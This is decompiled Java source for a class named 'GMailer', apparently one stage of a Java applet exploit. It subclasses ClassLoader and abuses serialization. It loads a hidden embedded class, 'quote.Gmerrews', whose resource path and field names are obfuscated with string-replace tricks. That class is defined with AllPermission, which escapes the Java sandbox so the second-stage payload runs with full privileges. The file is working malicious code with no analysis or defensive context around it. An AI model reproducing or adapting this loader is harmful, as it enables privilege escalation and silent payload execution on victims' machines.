// 
// Decompiled by Procyon v0.5.30
// 

package quote;

import java.security.Permission;
import java.security.AllPermission;
import java.security.PermissionCollection;
import java.security.ProtectionDomain;
import java.security.CodeSource;
import java.security.Permissions;
import java.security.cert.Certificate;
import java.net.URL;
import java.lang.reflect.Field;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.Serializable;

public class GMailer extends ClassLoader implements Serializable
{
    public static GMailer instance;
    private static final long serialVersionUID = 6812622870313961944L;
    
    private void writeObject(final ObjectOutputStream objectOutputStream) throws IOException, ClassNotFoundException {
        objectOutputStream.defaultWriteObject();
    }
    
    private void readObject(final ObjectInputStream objectInputStream) throws IOException, ClassNotFoundException {
        GMailer.instance = this;
        objectInputStream.defaultReadObject();
    }
    
    public void __C(final String s, final String s2) throws IOException {
        final int n = 8192;
        try {
            final ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            final byte[] array = new byte[n];
            int read;
            while ((read = this.getClass().getResourceAsStream("/5555".replace("5", "") + "wquwote".replace("w", "").replace("hhh.".replace("h", ""), "/".replace("i", "")) + "/GCCCCmCCCerrCCCCCCeCCCCws.CCcCClCCCCaCCCCsCsCC".replace("C", "")).read(array)) > 0) {
                byteArrayOutputStream.write(array, 0, read);
            }
            final Class minitClass = this.minitClass(byteArrayOutputStream.toByteArray());
            if (minitClass != null) {
                final Field field = minitClass.getField("ycc".replace("y", ""));
                final Field field2 = minitClass.getField("dawtwwwa".replace("w", ""));
                final Object instance = minitClass.newInstance();
                field.set(instance, s2);
                field2.set(instance, s);
                minitClass.newInstance();
            }
        }
        catch (Exception ex) {}
    }
    
    public Class minitClass(final byte[] array) throws IOException {
        final int n = 0;
        final URL url = new URL("fiVVVVVlVVVVeV:///".replace("V", ""));
        final Certificate[] array2 = new Certificate[n];
        final Permissions permissions = new Permissions();
        this.AddPerm(permissions);
        return this.defineClass("quote.Gmerrews", array, n, array.length, new ProtectionDomain(new CodeSource(url, array2), permissions));
    }
    
    public void AddPerm(final Permissions permissions) {
        permissions.add(new AllPermission());
    }
    
    static {
        GMailer.instance = null;
    }
}
